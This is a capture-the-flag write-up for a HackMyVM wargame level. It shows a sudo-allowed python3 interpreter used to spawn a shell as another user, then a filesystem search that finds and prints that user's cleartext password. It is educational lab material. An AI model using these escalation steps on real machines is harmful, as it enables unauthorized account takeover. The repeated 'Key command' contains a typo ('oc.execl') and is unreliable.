# 0x11
This write-up explains the steps taken to complete mission 0x11 on hades@hackmyvm.eu, starting from user `asia` and escalating to `asteria`.


## Mission
As usual, we read the objective first:
```bash
asia@hades:~$ cat  mission.txt 
################
# MISSION 0x11 #
################

## EN ##
The user asteria is teaching us to program in python. 
```
The mission for this stage introduced user `asteria` and her interest in Python programming.

## Method of solving
Upon checking the available `sudo` privileges, we find that the current user 	`asia` was permitted to run the Pythong 3 interpreter as user `asteria` without a password.
```bash
asia@hades:~$ sudo -l
Matching Defaults entries for asia on hades:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User asia may run the following commands on hades:
    (asteria) NOPASSWD: /usr/bin/python3
```
By leveraging Python's `os` module, we can execute a system call to spawn a shell. Since the interpreter was running under `asteria`'s context via `sudo`, the resulting shell inherited her privileges.
```bash
asia@hades:~$ sudo -u asteria python3 -c 'import os; os.execl("/bin/bash",  "bash")'
asteria@hades:/pwned/asia$ id
uid=2003(asteria) gid=2003(asteria) groups=2003(asteria)
```
**Explanation**:
- **Sudo Misconfiguration**: Allowing a user to run an interactive interpreter like Python via `sudo` is a major security risk. It allows the user to execute any arbitrary code with the target user's permissions.
- `os.execl`: This function in Python replaces the current process (the Python interpreter) with a new one (in this case, `/bin/bash`). `"bash"` here is the process display name (argv[0]). Because `sudo` was used, the identity of the process owner remains the target user `asteria`.

After obtaining the privileged shell, we search the filesystem for any files containing `asteria` to find the cleartext login password.
```bash
asteria@hades:/pwned/asia$ find / -name "*asteria*" 2>/dev/null
/usr/share/doc/asteria_pass.txt
/pwned/asteria
asteria@hades:/pwned/asia$ cat /usr/share/doc/asteria_pass.txt 
hawMVJCYrBgoDAMVhuwT
```
Using the identified password, we logged in to user `asteria` and get the flag.

## Key command
`sudo -u asteria python3 -c 'import os; oc.execl("/bin/bash", "bash")'`

`find / -name "*asteria*" 2>/dev/null`

***You are welcome!***

